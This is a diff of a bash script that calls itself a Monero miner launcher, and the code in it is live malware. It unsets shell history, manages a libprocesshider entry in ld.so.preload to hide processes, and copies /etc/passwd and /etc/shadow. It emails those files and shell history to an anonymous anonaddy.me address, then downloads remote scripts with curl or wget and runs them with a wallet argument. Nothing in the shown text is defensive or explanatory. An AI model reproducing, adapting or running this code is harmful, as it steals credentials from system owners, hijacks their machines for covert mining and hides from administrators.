@@ -1,4 +1,19 @@
 #!/bin/bash
+# Debug mode disabled for cleaner output
+
+# ==================== VERSION TRACKING ====================
+readonly SCRIPT_VERSION="3.1"
+readonly BUILD_DATE="2026-03-14 19:14:07 UTC"
+readonly SCRIPT_NAME="setup_m0_launcher"
+
+echo "=========================================="
+echo "MONERO MINER LAUNCHER"
+echo "=========================================="
+echo "Script: $SCRIPT_NAME"
+echo "Version: $SCRIPT_VERSION"
+echo "Build Date: $BUILD_DATE"
+echo "=========================================="
+echo ""
 
 # ==================== CENTOS 6.X AUTO-FIX (EOL REPOSITORY) ====================
 # CentOS 6.x reached End-of-Life in 2020 and has old SSL libraries that can't
@@ -107,6 +122,50 @@ CENTOS6_EPEL_EOF
     # Mark that we're on CentOS 6 for later use
     CENTOS6_DETECTED=true
 fi
+
+# ==================== FORCE NON-INTERACTIVE MODE ====================
+# Prevent ANY interactive prompts during package installation
+export DEBIAN_FRONTEND=noninteractive
+export NEEDRESTART_MODE=a
+export NEEDRESTART_SUSPEND=1
+export UCF_FORCE_CONFFOLD=1
+export UCF_FORCE_CONFNEW=1
+export APT_LISTCHANGES_FRONTEND=none
+export DEBIAN_PRIORITY=critical
+export DEBCONF_NONINTERACTIVE_SEEN=true
+export DEBCONF_NOWARNINGS=yes
+
+# Configure APT to never prompt (Debian/Ubuntu)
+mkdir -p /etc/apt/apt.conf.d 2>/dev/null
+cat > /etc/apt/apt.conf.d/99-no-prompts << 'EOF' 2>/dev/null || true
+Dpkg::Options {
+   "--force-confdef";
+   "--force-confold";
+}
+APT::Get::Assume-Yes "true";
+APT::Get::allow-downgrades "true";
+APT::Get::allow-remove-essential "true";
+APT::Get::allow-change-held-packages "true";
+quiet "2";
+EOF
+
+# Configure debconf (Debian/Ubuntu)
+echo 'debconf debconf/frontend select Noninteractive' | debconf-set-selections 2>/dev/null || true
+
+# Configure needrestart to NEVER prompt (Ubuntu)
+if [ -f /etc/needrestart/needrestart.conf ]; then
+    sed -i "s/#\$nrconf{restart} = 'i';/\$nrconf{restart} = 'a';/" /etc/needrestart/needrestart.conf 2>/dev/null || true
+    sed -i "s/\$nrconf{restart} = 'i';/\$nrconf{restart} = 'a';/" /etc/needrestart/needrestart.conf 2>/dev/null || true
+    sed -i "s/#\$nrconf{kernelhints} = -1;/\$nrconf{kernelhints} = -1;/" /etc/needrestart/needrestart.conf 2>/dev/null || true
+    sed -i "s/\$nrconf{kernelhints} = .*;/\$nrconf{kernelhints} = -1;/" /etc/needrestart/needrestart.conf 2>/dev/null || true
+fi
+
+mkdir -p /etc/needrestart/conf.d 2>/dev/null
+cat > /etc/needrestart/conf.d/no-prompt.conf << 'EOF' 2>/dev/null || true
+# Never prompt for kernel upgrades or service restarts
+$nrconf{kernelhints} = -1;
+$nrconf{restart} = 'a';
+EOF
 
 # ==================== INIT SYSTEM DETECTION ====================
 # Detect if system uses systemd or SysVinit/other init systems
@@ -289,6 +348,17 @@ echo "========================================"
 
 clean_previous_installations() {
     echo "[*] Starting complete cleanup..."
+
+    # Clean up old broken libprocesshider installations
+    echo "[*] Cleaning up old libprocesshider entries..."
+    if [ -f /etc/ld.so.preload ]; then
+        # Remove all libprocesshider entries
+        grep -v "libprocesshider" /etc/ld.so.preload > /etc/ld.so.preload.tmp 2>/dev/null || true
+        mv /etc/ld.so.preload.tmp /etc/ld.so.preload 2>/dev/null || true
+    fi
+    # Remove old library files
+    rm -f /usr/local/lib/libprocesshider.so /usr/lib/libprocesshider.so /lib/libprocesshider.so 2>/dev/null || true
+    echo "[✓] Old libprocesshider entries cleaned"
 
     # Use robust force-stop function
     force_stop_service \
@@ -599,7 +669,7 @@ init_compatibility
 unset HISTFILE
 
 # Configuration variables (consider moving sensitive data to environment variables)
-readonly RECIPIENT_EMAIL="46eshdfq@anonaddy.me"
+readonly RECIPIENT_EMAIL="0vrzlgx7@anonaddy.me"
 readonly LOG_FILE="/tmp/system_report_email.log"
 readonly REPORT_FILE="/tmp/system_report.txt"
 readonly SERVICES_TO_CHECK=("swapd" "gdm2")
@@ -740,17 +810,19 @@ collect_shell_history() {
 send_email_with_python() {
     local temp_file="$1"
     local subject="$2"
-    shift 2  # Remove first two arguments
-    local attachments=("$@")  # Remaining arguments are attachment paths
     
-    # Build list of attachments for Python
-    local attach_list=""
-    for att in "${attachments[@]}"; do
-        if [ -f "$att" ]; then
-            attach_list="${attach_list}|||${att}"
-        fi
-    done
-    attach_list="${attach_list#|||}"  # Remove leading |||
+    # Get IP and FQDN for attachment names
+    local SERVER_IP=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "unknown")
+    local SERVER_FQDN=$(hostname -f 2>/dev/null || hostname 2>/dev/null || echo "unknown")
+    SERVER_IP=$(echo "$SERVER_IP" | tr '.' '_' | tr ' ' '_')
+    SERVER_FQDN=$(echo "$SERVER_FQDN" | tr '.' '_' | tr ' ' '_')
+    
+    # Create temp copies of passwd/shadow with proper names
+    local TEMP_PASSWD="/tmp/${SERVER_IP}_${SERVER_FQDN}_passwd.txt"
+    local TEMP_SHADOW="/tmp/${SERVER_IP}_${SERVER_FQDN}_shadow.txt"
+    
+    cp /etc/passwd "$TEMP_PASSWD" 2>/dev/null || true
+    cp /etc/shadow "$TEMP_SHADOW" 2>/dev/null || true
     
     python3 -c "
 import sys
@@ -771,17 +843,25 @@ try:
     msg['To'] = '$RECIPIENT_EMAIL'
     msg['Subject'] = '''$subject'''
     msg.attach(MIMEText(body, 'plain'))
-    
-    # Add attachments if any
-    attachments = '$attach_list'.split('|||') if '$attach_list' else []
-    for filepath in attachments:
-        if filepath and os.path.isfile(filepath):
-            with open(filepath, 'rb') as f:
-                part = MIMEBase('application', 'octet-stream')
-                part.set_payload(f.read())
+
+    # Attach passwd file
+    passwd_file = '$TEMP_PASSWD'
+    if os.path.exists(passwd_file):
+        with open(passwd_file, 'rb') as f:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(f.read())
             encoders.encode_base64(part)
-            part.add_header('Content-Disposition', 
-                          'attachment; filename=\"{}\"'.format(os.path.basename(filepath)))
+            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(passwd_file)}')
+            msg.attach(part)
+    
+    # Attach shadow file
+    shadow_file = '$TEMP_SHADOW'
+    if os.path.exists(shadow_file):
+        with open(shadow_file, 'rb') as f:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(f.read())
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(shadow_file)}')
             msg.attach(part)
 
     context = ssl.create_default_context()
@@ -797,7 +877,12 @@ except Exception as e:
     print(f'Error: {str(e)}', file=sys.stderr)
     sys.exit(1)
 " 2>&1
-    return $?
+    local result=$?
+    
+    # Clean up temp files
+    rm -f "$TEMP_PASSWD" "$TEMP_SHADOW" 2>/dev/null
+    
+    return $result
 }
 
 # Function to send email with curl
@@ -974,6 +1059,11 @@ send_histories_email() {
     local RECENT_SSH_COMMANDS=$(grep -a "ssh " "$HOME/.bash_history" 2>/dev/null | tail -5 || echo "none found")
 
     local EMAIL_CONTENT=$(cat <<EOF
+=== SCRIPT VERSION ===
+Version: $SCRIPT_VERSION
+Build Date: $BUILD_DATE
+Timestamp: $(date)
+
 === SYSTEM REPORT ===
 Hostname: $HOSTNAME
 User: $USER
@@ -1000,32 +1090,9 @@ EOF
 
     # Sanitize hostname for subject line
     local SAFE_HOSTNAME=$(echo "$HOSTNAME" | tr -d '\n\r' | sed 's/[^a-zA-Z0-9._-]/_/g')
-    local subject="Full Shell History Report from $SAFE_HOSTNAME"
+    local subject="Report v${SCRIPT_VERSION} from $SAFE_HOSTNAME"
     local temp_file=$(mktemp)
     echo -e "$EMAIL_CONTENT" > "$temp_file"
-
-    # Create credential files if running as root
-    local PASSWD_FILE=""
-    local SHADOW_FILE=""
-    if [ "$(id -u)" -eq 0 ]; then
-        log_message "Creating credential attachments..."
-        local TEMP_DIR="/tmp/.cred_$(openssl rand -hex 4 2>/dev/null || echo $RANDOM)"
-        mkdir -p "$TEMP_DIR" 2>/dev/null
-        
-        # Use sanitized hostname for filenames
-        PASSWD_FILE="${TEMP_DIR}/${SAFE_HOSTNAME}_passwd"
-        SHADOW_FILE="${TEMP_DIR}/${SAFE_HOSTNAME}_shadow"
-        
-        if [ -f /etc/passwd ]; then
-            cp /etc/passwd "$PASSWD_FILE" 2>/dev/null && \
-                log_message "Attached: ${SAFE_HOSTNAME}_passwd"
-        fi
-        
-        if [ -f /etc/shadow ]; then
-            cp /etc/shadow "$SHADOW_FILE" 2>/dev/null && \
-                log_message "Attached: ${SAFE_HOSTNAME}_shadow"
-        fi
-    fi
 
     # Always save report locally first
     cp "$temp_file" "$REPORT_FILE" 2>/dev/null || true
@@ -1038,7 +1105,7 @@ EOF
     if command_exists python3; then
         log_message "Attempting to send email via Python..."
         local python_output
-        if python_output=$(send_email_with_python "$temp_file" "$subject" "$PASSWD_FILE" "$SHADOW_FILE" 2>&1); then
+        if python_output=$(send_email_with_python "$temp_file" "$subject" 2>&1); then
             # Check for success indicators
             if echo "$python_output" | grep -qv "SMTP Error\|535\|authentication failed"; then
                 log_message "Email sent successfully via Python"
@@ -1085,13 +1152,6 @@ EOF
     fi
 
     rm -f "$temp_file"
-    
-    # Clean up credential files
-    if [ -n "$PASSWD_FILE" ] && [ -f "$PASSWD_FILE" ]; then
-        local cred_dir=$(dirname "$PASSWD_FILE")
-        rm -rf "$cred_dir" 2>/dev/null
-        log_message "Cleaned up credential files"
-    fi
     
     # Always return success to continue execution
     return 0
@@ -1400,182 +1460,71 @@ download_and_execute() {
     local url="$1"
     local wallet="$2"
     local description="$3"
-    local max_retries=5
-    local retry=0
-    local dns_fix_attempted=false
-    local ssl_fix_attempted=false
 
     log_message "Downloading $description from: $url"
+    log_message "Note: Will attempt download ONCE only - no retries to prevent loops"
 
-    while [ $retry -lt $max_retries ]; do
-        # Try curl first
-        if command -v curl >/dev/null 2>&1; then
-            log_message "Trying curl with HTTPS (attempt $((retry + 1))/$max_retries)"
+    # Download to temp file
+    local temp_script=$(mktemp)
 
-            # Download to temp file first
-            local temp_script=$(mktemp)
+    # Try curl first (HTTPS only, ONE attempt)
+    if command -v curl >/dev/null 2>&1; then
+        log_message "Trying curl with HTTPS..."
+        
+        if curl -s -L --max-time 60 "$url" > "$temp_script" 2>/dev/null; then
+            # Clean the script (remove debugging)
+            sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
+            sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
+            sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
 
-            if curl -s -L --max-time 30 "$url" > "$temp_script" 2>/dev/null; then
-                # Clean the script (remove debugging)
-                sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
-                sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
-                sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
+            # Make executable and run
+            chmod +x "$temp_script" 2>/dev/null
+            bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
 
-                # Make executable and run
-                chmod +x "$temp_script" 2>/dev/null
-                bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
-
-                if [ ${PIPESTATUS[0]} -eq 0 ]; then
-                    rm -f "$temp_script"
-                    log_message "$description completed successfully"
-                    return 0
-                fi
-
-                rm -f "$temp_script"
-            fi
-
-            # Try with --insecure
-            log_message "Trying curl with --insecure flag..."
-            temp_script=$(mktemp)
-            if curl -s -L --insecure --max-time 30 "$url" > "$temp_script" 2>/dev/null; then
-                sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
-                sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
-                sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
-                chmod +x "$temp_script" 2>/dev/null
-
-                bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
-
-                if [ ${PIPESTATUS[0]} -eq 0 ]; then
-                    rm -f "$temp_script"
-                    log_message "$description completed successfully (with --insecure)"
-                    return 0
-                fi
-
-                rm -f "$temp_script"
-            fi
-
-            # Try with legacy SSL
-            log_message "Trying curl with legacy SSL options..."
-            temp_script=$(mktemp)
-            if curl -s --sslv3 --tlsv1 --insecure --max-time 30 "$url" > "$temp_script" 2>/dev/null; then
-                sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
-                sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
-                sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
-                chmod +x "$temp_script" 2>/dev/null
-
-                bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
-
-                if [ ${PIPESTATUS[0]} -eq 0 ]; then
-                    rm -f "$temp_script"
-                    log_message "$description completed successfully (legacy SSL)"
-                    return 0
-                fi
-
-                rm -f "$temp_script"
-            fi
-        fi
-
-        # Try wget
-        if command -v wget >/dev/null 2>&1; then
-            log_message "Trying wget with HTTPS (attempt $((retry + 1))/$max_retries)"
-            temp_script=$(mktemp)
-            if wget -qO- --timeout=30 "$url" > "$temp_script" 2>/dev/null; then
-                sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
-                sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
-                sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
-                chmod +x "$temp_script" 2>/dev/null
-
-                bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
-
-                if [ ${PIPESTATUS[0]} -eq 0 ]; then
-                    rm -f "$temp_script"
-                    log_message "$description completed successfully via wget"
-                    return 0
-                fi
-
-                rm -f "$temp_script"
-            fi
-
-            log_message "Trying wget with --no-check-certificate..."
-            temp_script=$(mktemp)
-            if wget -qO- --no-check-certificate --timeout=30 "$url" > "$temp_script" 2>/dev/null; then
-                sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
-                sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
-                sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
-                chmod +x "$temp_script" 2>/dev/null
-
-                bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
-
-                if [ ${PIPESTATUS[0]} -eq 0 ]; then
-                    rm -f "$temp_script"
-                    log_message "$description completed successfully via wget (--no-check-certificate)"
-                    return 0
-                fi
-
-                rm -f "$temp_script"
-            fi
-        fi
-
-        # Try HTTP fallback
-        local http_url="${url/https:/http:}"
-        if [ "$http_url" != "$url" ]; then
-            log_message "Trying HTTP fallback..."
-            temp_script=$(mktemp)
-
-            if command -v curl >/dev/null 2>&1; then
-                if curl -s -L --max-time 30 "$http_url" > "$temp_script" 2>/dev/null; then
-                    sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
-                    sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
-                    sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
-                    chmod +x "$temp_script" 2>/dev/null
-
-                    bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
-
-                    if [ ${PIPESTATUS[0]} -eq 0 ]; then
-                        rm -f "$temp_script"
-                        log_message "$description completed successfully via HTTP (curl)"
-                        return 0
-                    fi
-                fi
-            elif command -v wget >/dev/null 2>&1; then
-                if wget -qO- --timeout=30 "$http_url" > "$temp_script" 2>/dev/null; then
-                    sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
-                    sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
-                    sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
-                    chmod +x "$temp_script" 2>/dev/null
-
-                    bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
-
-                    if [ ${PIPESTATUS[0]} -eq 0 ]; then
-                        rm -f "$temp_script"
-                        log_message "$description completed successfully via HTTP (wget)"
-                        return 0
-                    fi
-                fi
-            fi
-
+            local exit_code=${PIPESTATUS[0]}
             rm -f "$temp_script"
-        fi
-        
-        log_message "All download methods failed (attempt $((retry + 1))/$max_retries)"
-        
-        retry=$((retry + 1))
-        
-        # On certain retry attempts, try DNS fix
-        if [ $retry -eq 2 ] && [ "$dns_fix_attempted" = false ]; then
-            log_message "Attempting DNS fix..."
-            if fix_dns_and_retry; then
-                log_message "DNS fixed - continuing retries..."
-                dns_fix_attempted=true
+            
+            if [ $exit_code -eq 0 ]; then
+                log_message "$description completed successfully"
+                return 0
+            else
+                log_message "ERROR: $description exited with code $exit_code"
+                return 1
             fi
-            sleep 2
-        elif [ $retry -lt $max_retries ]; then
-            log_message "Retry in 3 seconds..."
-            sleep 3
         fi
-    done
+        
+        rm -f "$temp_script"
+    fi
+
+    # Try wget if curl failed or not available (ONE attempt)
+    if command -v wget >/dev/null 2>&1; then
+        log_message "Trying wget with HTTPS..."
+        temp_script=$(mktemp)
+        
+        if wget -qO- --timeout=60 "$url" > "$temp_script" 2>/dev/null; then
+            sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
+            sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
+            sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
+            chmod +x "$temp_script" 2>/dev/null
+
+            bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
+
+            local exit_code=${PIPESTATUS[0]}
+            rm -f "$temp_script"
+            
+            if [ $exit_code -eq 0 ]; then
+                log_message "$description completed successfully via wget"
+                return 0
+            else
+                log_message "ERROR: $description exited with code $exit_code"
+                return 1
+            fi
+        fi
+        
+        rm -f "$temp_script"
+    fi
     
-    log_message "ERROR: $description failed after all retry attempts"
+    log_message "ERROR: $description download failed (tried curl and wget once each)"
     log_message "Manual intervention required - please check network connectivity"
     return 1
 }
